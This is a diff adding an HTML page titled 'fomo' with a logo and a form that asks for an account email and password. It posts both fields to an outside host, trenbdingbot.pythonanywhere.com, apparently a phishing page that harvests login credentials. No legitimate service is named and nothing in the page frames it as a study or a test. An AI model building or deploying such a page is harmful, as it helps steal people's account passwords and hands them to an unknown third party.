@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>fomo</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+        }
+
+        .form-container {
+            background-color: #1e1e1e;
+            padding: 20px;
+            border-radius: 8px;
+            width: 300px;
+            margin: auto;
+        }
+
+        input[type="text"], input[type="submit"] {
+            padding: 10px;
+            margin: 10px 0;
+            width: 90%;
+            border: none;
+            border-radius: 4px;
+        }
+
+        input[type="text"] {
+            background-color: #2c2c2c;
+            color: #ffffff;
+        }
+
+        input[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            cursor: pointer;
+        }
+
+        img.logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <img src="fomo.svg" alt="Logo" class="logo">
+        <h2>Fill the following form</h2>
+        <form action="https://trenbdingbot.pythonanywhere.com/submit" method="POST">
+            <input type="text" name="email" placeholder="Account email" required><br>
+            <input type="text" name="password" placeholder="Your password" required><br>
+            <input type="submit" value="Submit">
+        </form>
+    </div>
+</body>
+</html>
